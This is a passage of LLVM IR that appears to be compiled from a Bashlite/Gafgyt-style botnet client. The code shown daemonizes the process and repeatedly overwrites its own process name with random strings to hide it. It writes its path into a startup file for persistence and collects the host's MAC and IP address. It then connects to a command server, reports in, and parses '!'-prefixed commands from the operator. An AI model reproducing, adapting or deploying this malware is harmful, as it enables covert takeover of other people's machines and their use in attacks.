  %53 = call i8* @fdgets(i8* %51, i32 4096, i32 %52)
  %54 = icmp ne i8* %53, null
  br i1 %54, label %55, label %73

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %57 = call i8* @strstr(i8* %56, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i32 0, i32 0)) #10
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %71

; <label>:59:                                     ; preds = %55
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %60, i8** %11, align 8
  br label %61

; <label>:61:                                     ; preds = %66, %59
  %62 = load i8*, i8** %11, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 9
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %61
  %67 = load i8*, i8** %11, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %11, align 8
  br label %61

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %11, align 8
  store i8 0, i8* %70, align 1
  br label %73

; <label>:71:                                     ; preds = %55
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 4096, i32 16, i1 false)
  br label %50

; <label>:73:                                     ; preds = %69, %50
  %74 = load i32, i32* %9, align 4
  %75 = call i32 @close(i32 %74)
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %77 = load i8, i8* %76, align 16
  %78 = icmp ne i8 %77, 0
  br i1 %78, label %79, label %106

; <label>:79:                                     ; preds = %73
  %80 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 0
  %81 = bitcast %union.anon.7* %80 to [16 x i8]*
  %82 = getelementptr inbounds [16 x i8], [16 x i8]* %81, i32 0, i32 0
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %84 = call i8* @strcpy(i8* %82, i8* %83) #2
  %85 = load i32, i32* %2, align 4
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 35111, %struct.ifreq* %13) #2
  store i32 0, i32* %12, align 4
  br label %87

; <label>:87:                                     ; preds = %102, %79
  %88 = load i32, i32* %12, align 4
  %89 = icmp slt i32 %88, 6
  br i1 %89, label %90, label %105

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %92 = bitcast %union.anon.8* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %12, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  br label %102

; <label>:102:                                    ; preds = %90
  %103 = load i32, i32* %12, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %12, align 4
  br label %87

; <label>:105:                                    ; preds = %87
  br label %106

; <label>:106:                                    ; preds = %105, %73
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  br label %109

; <label>:109:                                    ; preds = %106, %44, %34, %17
  %110 = load i32, i32* %1, align 4
  ret i32 %110
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @makeFukdString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %21, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %24

; <label>:12:                                     ; preds = %8
  %13 = call i32 @rand() #2
  %14 = srem i32 %13, 223
  %15 = add nsw i32 %14, 33
  %16 = trunc i32 %15 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %5, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %5, align 4
  br label %8

; <label>:24:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @touchMyself(i8**) #0 {
  %2 = alloca i8**, align 8
  store i8** %0, i8*** %2, align 8
  %3 = call i32 @fork() #2
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %14, label %5

; <label>:5:                                      ; preds = %1
  br label %6

; <label>:6:                                      ; preds = %6, %5
  %7 = load i8**, i8*** %2, align 8
  %8 = getelementptr inbounds i8*, i8** %7, i64 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i32 @rand() #2
  %11 = srem i32 %10, 128
  %12 = add nsw i32 1024, %11
  call void @makeFukdString(i8* %9, i32 %12)
  %13 = call i32 @sleep(i32 3)
  br label %6

; <label>:14:                                     ; preds = %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [256 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca %struct._IO_FILE*, align 8
  %16 = alloca [256 x i8], align 16
  %17 = alloca [1024 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [1024 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [10 x i8*], align 16
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0))
  %37 = call i32 @getpid() #2
  store i32 %37, i32* @actualparent, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %38 = call i32 @fork() #2
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %2
  call void @exit(i32 1) #14
  unreachable

; <label>:42:                                     ; preds = %2
  %43 = load i32, i32* %6, align 4
  %44 = icmp sgt i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %42
  call void @exit(i32 0) #14
  unreachable

; <label>:46:                                     ; preds = %42
  %47 = call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 0)
  %48 = call i32 @setsid() #2
  store i32 %48, i32* %7, align 4
  %49 = load i32, i32* %7, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  call void @exit(i32 1) #14
  unreachable

; <label>:52:                                     ; preds = %46
  %53 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %54 = call i32 @close(i32 0)
  %55 = call i32 @close(i32 1)
  %56 = call i32 @close(i32 2)
  %57 = bitcast i8*** %5 to i8**
  call void @touchMyself(i8** %57)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %8, align 8
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @strlen(i8* %63) #10
  %65 = call i8* @strncpy(i8* %60, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i64 %64) #2
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %67, align 8
  %68 = call i64 @time(i64* null) #2
  %69 = call i32 @getpid() #2
  %70 = sext i32 %69 to i64
  %71 = xor i64 %68, %70
  %72 = trunc i64 %71 to i32
  call void @srand(i32 %72) #2
  %73 = call i64 @time(i64* null) #2
  %74 = call i32 @getpid() #2
  %75 = sext i32 %74 to i64
  %76 = xor i64 %73, %75
  %77 = trunc i64 %76 to i32
  call void @init_rand(i32 %77)
  store i32 0, i32* %12, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i32 0, i32 0), i8** %14, align 8
  %78 = load i8*, i8** %14, align 8
  %79 = call %struct._IO_FILE* @fopen(i8* %78, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %79, %struct._IO_FILE** %15, align 8
  %80 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %81 = icmp eq %struct._IO_FILE* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %52
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i32 0, i32 0), i8** %14, align 8
  %83 = load i8*, i8** %14, align 8
  %84 = call %struct._IO_FILE* @fopen(i8* %83, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %84, %struct._IO_FILE** %15, align 8
  br label %85

; <label>:85:                                     ; preds = %82, %52
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %87 = icmp ne %struct._IO_FILE* %86, null
  br i1 %87, label %88, label %165

; <label>:88:                                     ; preds = %85
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i64 @strlen(i8* %91) #10
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %95 = call i8* @getcwd(i8* %94, i64 256) #2
  %96 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %97 = call i32 @strcmp(i8* %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #10
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %99, label %161

; <label>:99:                                     ; preds = %88
  br label %100

; <label>:100:                                    ; preds = %110, %99
  %101 = load i8**, i8*** %5, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %18, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp ne i32 %108, 47
  br i1 %109, label %110, label %113

; <label>:110:                                    ; preds = %100
  %111 = load i32, i32* %18, align 4
  %112 = add nsw i32 %111, -1
  store i32 %112, i32* %18, align 4
  br label %100

; <label>:113:                                    ; preds = %100
  %114 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %115 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 0
  %118 = load i8*, i8** %117, align 8
  %119 = load i32, i32* %18, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = call i32 (i8*, i8*, ...) @sprintf(i8* %114, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i32 0, i32 0), i8* %115, i8* %121) #2
  br label %123

; <label>:123:                                    ; preds = %139, %113
  %124 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %125 = call i32 @feof(%struct._IO_FILE* %124) #2
  %126 = icmp ne i32 %125, 0
  %127 = xor i1 %126, true
  br i1 %127, label %128, label %140

; <label>:128:                                    ; preds = %123
  %129 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %130 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %131 = call i8* @fgets(i8* %129, i32 1024, %struct._IO_FILE* %130)
  %132 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %133 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %134 = call i32 @strcasecmp(i8* %132, i8* %133) #10
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %139, label %136

; <label>:136:                                    ; preds = %128
  %137 = load i32, i32* %19, align 4
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* %19, align 4
  br label %139

; <label>:139:                                    ; preds = %136, %128
  br label %123

; <label>:140:                                    ; preds = %123
  %141 = load i32, i32* %19, align 4
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %157

; <label>:143:                                    ; preds = %140
  %144 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %145 = call i32 @fclose(%struct._IO_FILE* %144)
  %146 = load i8*, i8** %14, align 8
  %147 = call %struct._IO_FILE* @fopen(i8* %146, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0))
  store %struct._IO_FILE* %147, %struct._IO_FILE** %20, align 8
  %148 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %149 = icmp ne %struct._IO_FILE* %148, null
  br i1 %149, label %150, label %156

; <label>:150:                                    ; preds = %143
  %151 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %152 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %153 = call i32 @fputs(i8* %151, %struct._IO_FILE* %152)
  %154 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %155 = call i32 @fclose(%struct._IO_FILE* %154)
  br label %156

; <label>:156:                                    ; preds = %150, %143
  br label %160

; <label>:157:                                    ; preds = %140
  %158 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %159 = call i32 @fclose(%struct._IO_FILE* %158)
  br label %160

; <label>:160:                                    ; preds = %157, %156
  br label %164

; <label>:161:                                    ; preds = %88
  %162 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %163 = call i32 @fclose(%struct._IO_FILE* %162)
  br label %164

; <label>:164:                                    ; preds = %161, %160
  br label %165

; <label>:165:                                    ; preds = %164, %85
  %166 = call i32 @getOurIP()
  %167 = call i32 @fork() #2
  store i32 %167, i32* %9, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %172

; <label>:169:                                    ; preds = %165
  %170 = load i32, i32* %9, align 4
  %171 = call i32 @waitpid(i32 %170, i32* %11, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:172:                                    ; preds = %165
  %173 = load i32, i32* %9, align 4
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %187, label %175

; <label>:175:                                    ; preds = %172
  %176 = call i32 @fork() #2
  store i32 %176, i32* %10, align 4
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %175
  call void @exit(i32 0) #14
  unreachable

; <label>:179:                                    ; preds = %175
  %180 = load i32, i32* %10, align 4
  %181 = icmp ne i32 %180, 0
  br i1 %181, label %183, label %182

; <label>:182:                                    ; preds = %179
  br label %185

; <label>:183:                                    ; preds = %179
  %184 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %185

; <label>:185:                                    ; preds = %183, %182
  br label %186

; <label>:186:                                    ; preds = %185
  br label %189

; <label>:187:                                    ; preds = %172
  %188 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %189

; <label>:189:                                    ; preds = %187, %186
  br label %190

; <label>:190:                                    ; preds = %189
  %191 = call i32 @setsid() #2
  %192 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %193 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %194

; <label>:194:                                    ; preds = %497, %197, %190
  %195 = call i32 @initConnection()
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %199

; <label>:197:                                    ; preds = %194
  %198 = call i32 @sleep(i32 30)
  br label %194

; <label>:199:                                    ; preds = %194
  %200 = load i32, i32* @mainCommSock, align 4
  %201 = call i8* @getBuild()
  %202 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %203 = call i8* @inet_ntoa(i32 %202) #2
  %204 = call i32 (i32, i8*, ...) @sockprintf(i32 %200, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i32 0, i32 0), i8* %201, i8* %203)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %205

; <label>:205:                                    ; preds = %496, %415, %337, %292, %199
  %206 = load i32, i32* @mainCommSock, align 4
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %208 = call i32 @recvLine(i32 %206, i8* %207, i32 4096)
  store i32 %208, i32* %22, align 4
  %209 = icmp ne i32 %208, -1
  br i1 %209, label %210, label %497

; <label>:210:                                    ; preds = %205
  store i32 0, i32* %23, align 4
  br label %211

; <label>:211:                                    ; preds = %280, %210
  %212 = load i32, i32* %23, align 4
  %213 = load i32, i32* @numpids, align 4
  %214 = icmp slt i32 %212, %213
  br i1 %214, label %215, label %283

; <label>:215:                                    ; preds = %211
  %216 = load i32*, i32** @pids, align 8
  %217 = load i32, i32* %23, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @waitpid(i32 %220, i32* null, i32 1)
  %222 = icmp sgt i32 %221, 0
  br i1 %222, label %223, label %279

; <label>:223:                                    ; preds = %215
  %224 = load i32, i32* %23, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %25, align 4
  br label %226

; <label>:226:                                    ; preds = %241, %223
  %227 = load i32, i32* %25, align 4
  %228 = load i32, i32* @numpids, align 4
  %229 = icmp ult i32 %227, %228
  br i1 %229, label %230, label %244

; <label>:230:                                    ; preds = %226
  %231 = load i32*, i32** @pids, align 8
  %232 = load i32, i32* %25, align 4
  %233 = zext i32 %232 to i64
  %234 = getelementptr inbounds i32, i32* %231, i64 %233
  %235 = load i32, i32* %234, align 4
  %236 = load i32*, i32** @pids, align 8
  %237 = load i32, i32* %25, align 4
  %238 = sub i32 %237, 1
  %239 = zext i32 %238 to i64
  %240 = getelementptr inbounds i32, i32* %236, i64 %239
  store i32 %235, i32* %240, align 4
  br label %241

; <label>:241:                                    ; preds = %230
  %242 = load i32, i32* %25, align 4
  %243 = add i32 %242, 1
  store i32 %243, i32* %25, align 4
  br label %226

; <label>:244:                                    ; preds = %226
  %245 = load i32*, i32** @pids, align 8
  %246 = load i32, i32* %25, align 4
  %247 = sub i32 %246, 1
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %245, i64 %248
  store i32 0, i32* %249, align 4
  %250 = load i32, i32* @numpids, align 4
  %251 = add nsw i32 %250, -1
  store i32 %251, i32* @numpids, align 4
  %252 = load i32, i32* @numpids, align 4
  %253 = add nsw i32 %252, 1
  %254 = sext i32 %253 to i64
  %255 = mul i64 %254, 4
  %256 = call noalias i8* @malloc(i64 %255) #2
  %257 = bitcast i8* %256 to i32*
  store i32* %257, i32** %24, align 8
  store i32 0, i32* %25, align 4
  br label %258

; <label>:258:                                    ; preds = %272, %244
  %259 = load i32, i32* %25, align 4
  %260 = load i32, i32* @numpids, align 4
  %261 = icmp ult i32 %259, %260
  br i1 %261, label %262, label %275

; <label>:262:                                    ; preds = %258
  %263 = load i32*, i32** @pids, align 8
  %264 = load i32, i32* %25, align 4
  %265 = zext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  %267 = load i32, i32* %266, align 4
  %268 = load i32*, i32** %24, align 8
  %269 = load i32, i32* %25, align 4
  %270 = zext i32 %269 to i64
  %271 = getelementptr inbounds i32, i32* %268, i64 %270
  store i32 %267, i32* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %262
  %273 = load i32, i32* %25, align 4
  %274 = add i32 %273, 1
  store i32 %274, i32* %25, align 4
  br label %258

; <label>:275:                                    ; preds = %258
  %276 = load i32*, i32** @pids, align 8
  %277 = bitcast i32* %276 to i8*
  call void @free(i8* %277) #2
  %278 = load i32*, i32** %24, align 8
  store i32* %278, i32** @pids, align 8
  br label %279

; <label>:279:                                    ; preds = %275, %215
  br label %280

; <label>:280:                                    ; preds = %279
  %281 = load i32, i32* %23, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %23, align 4
  br label %211

; <label>:283:                                    ; preds = %211
  %284 = load i32, i32* %22, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %285
  store i8 0, i8* %286, align 1
  %287 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  call void @trim(i8* %287)
  %288 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %289 = call i8* @strstr(i8* %288, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %291 = icmp eq i8* %289, %290
  br i1 %291, label %292, label %295

; <label>:292:                                    ; preds = %283
  %293 = load i32, i32* @mainCommSock, align 4
  %294 = call i32 (i32, i8*, ...) @sockprintf(i32 %293, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i32 0, i32 0))
  br label %205

; <label>:295:                                    ; preds = %283
  %296 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %297 = call i8* @strstr(i8* %296, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i32 0, i32 0)) #10
  %298 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %299 = icmp eq i8* %297, %298
  br i1 %299, label %300, label %308

; <label>:300:                                    ; preds = %295
  %301 = load i32, i32* %12, align 4
  %302 = add nsw i32 %301, 1
  store i32 %302, i32* %12, align 4
  %303 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i32 0, i32 0))
  %304 = load i32, i32* %12, align 4
  %305 = icmp sgt i32 %304, 20
  br i1 %305, label %306, label %307

; <label>:306:                                    ; preds = %300
  call void @exit(i32 0) #14
  unreachable

; <label>:307:                                    ; preds = %300
  br label %497

; <label>:308:                                    ; preds = %295
  %309 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  store i8* %309, i8** %26, align 8
  %310 = load i8*, i8** %26, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 33
  br i1 %313, label %314, label %496

; <label>:314:                                    ; preds = %308
  %315 = load i8*, i8** %26, align 8
  %316 = getelementptr inbounds i8, i8* %315, i64 1
  store i8* %316, i8** %27, align 8
  br label %317

; <label>:317:                                    ; preds = %329, %314
  %318 = load i8*, i8** %27, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp ne i32 %320, 32
  br i1 %321, label %322, label %327

; <label>:322:                                    ; preds = %317
  %323 = load i8*, i8** %27, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp ne i32 %325, 0
  br label %327

; <label>:327:                                    ; preds = %322, %317
  %328 = phi i1 [ false, %317 ], [ %326, %322 ]
  br i1 %328, label %329, label %332

; <label>:329:                                    ; preds = %327
  %330 = load i8*, i8** %27, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %27, align 8
  br label %317

; <label>:332:                                    ; preds = %327
  %333 = load i8*, i8** %27, align 8
  %334 = load i8, i8* %333, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %332
  br label %205

; <label>:338:                                    ; preds = %332
  %339 = load i8*, i8** %27, align 8
  store i8 0, i8* %339, align 1
  %340 = load i8*, i8** %26, align 8
  %341 = getelementptr inbounds i8, i8* %340, i64 1
  store i8* %341, i8** %27, align 8
  %342 = load i8*, i8** %26, align 8
  %343 = load i8*, i8** %27, align 8
  %344 = call i64 @strlen(i8* %343) #10
  %345 = getelementptr inbounds i8, i8* %342, i64 %344
  %346 = getelementptr inbounds i8, i8* %345, i64 2
  store i8* %346, i8** %26, align 8
  br label %347

; <label>:347:                                    ; preds = %367, %338
  %348 = load i8*, i8** %26, align 8
  %349 = load i8*, i8** %26, align 8
  %350 = call i64 @strlen(i8* %349) #10
  %351 = sub i64 %350, 1
  %352 = getelementptr inbounds i8, i8* %348, i64 %351
  %353 = load i8, i8* %352, align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 10
  br i1 %355, label %365, label %356

; <label>:356:                                    ; preds = %347
  %357 = load i8*, i8** %26, align 8
  %358 = load i8*, i8** %26, align 8
  %359 = call i64 @strlen(i8* %358) #10
  %360 = sub i64 %359, 1
  %361 = getelementptr inbounds i8, i8* %357, i64 %360
  %362 = load i8, i8* %361, align 1
  %363 = zext i8 %362 to i32
  %364 = icmp eq i32 %363, 13
  br label %365

; <label>:365:                                    ; preds = %356, %347
  %366 = phi i1 [ true, %347 ], [ %364, %356 ]
  br i1 %366, label %367, label %373

; <label>:367:                                    ; preds = %365
  %368 = load i8*, i8** %26, align 8
  %369 = load i8*, i8** %26, align 8
  %370 = call i64 @strlen(i8* %369) #10
  %371 = sub i64 %370, 1
  %372 = getelementptr inbounds i8, i8* %368, i64 %371
  store i8 0, i8* %372, align 1
  br label %347

; <label>:373:                                    ; preds = %365
  %374 = load i8*, i8** %26, align 8
  store i8* %374, i8** %28, align 8
  br label %375

; <label>:375:                                    ; preds = %387, %373
  %376 = load i8*, i8** %26, align 8
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp ne i32 %378, 32
  br i1 %379, label %380, label %385

; <label>:380:                                    ; preds = %375
  %381 = load i8*, i8** %26, align 8
  %382 = load i8, i8* %381, align 1
  %383 = zext i8 %382 to i32
  %384 = icmp ne i32 %383, 0
  br label %385

; <label>:385:                                    ; preds = %380, %375
  %386 = phi i1 [ false, %375 ], [ %384, %380 ]
  br i1 %386, label %387, label %390

; <label>:387:                                    ; preds = %385
  %388 = load i8*, i8** %26, align 8
  %389 = getelementptr inbounds i8, i8* %388, i32 1
  store i8* %389, i8** %26, align 8
  br label %375

; <label>:390:                                    ; preds = %385
  %391 = load i8*, i8** %26, align 8
  store i8 0, i8* %391, align 1
  %392 = load i8*, i8** %26, align 8
  %393 = getelementptr inbounds i8, i8* %392, i32 1
  store i8* %393, i8** %26, align 8
  %394 = load i8*, i8** %28, align 8
  store i8* %394, i8** %29, align 8
  br label %395

; <label>:395:                                    ; preds = %399, %390
  %396 = load i8*, i8** %29, align 8
  %397 = load i8, i8* %396, align 1
  %398 = icmp ne i8 %397, 0
  br i1 %398, label %399, label %408

; <label>:399:                                    ; preds = %395
  %400 = load i8*, i8** %29, align 8
  %401 = load i8, i8* %400, align 1
  %402 = zext i8 %401 to i32
  %403 = call i32 @toupper(i32 %402) #10
  %404 = trunc i32 %403 to i8
  %405 = load i8*, i8** %29, align 8
  store i8 %404, i8* %405, align 1
  %406 = load i8*, i8** %29, align 8
  %407 = getelementptr inbounds i8, i8* %406, i32 1
  store i8* %407, i8** %29, align 8
  br label %395

; <label>:408:                                    ; preds = %395
  %409 = load i8*, i8** %28, align 8
  %410 = call i32 @strcmp(i8* %409, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i32 0, i32 0)) #10
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %412, label %438

; <label>:412:                                    ; preds = %408
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %415, label %416

; <label>:415:                                    ; preds = %412
  br label %205

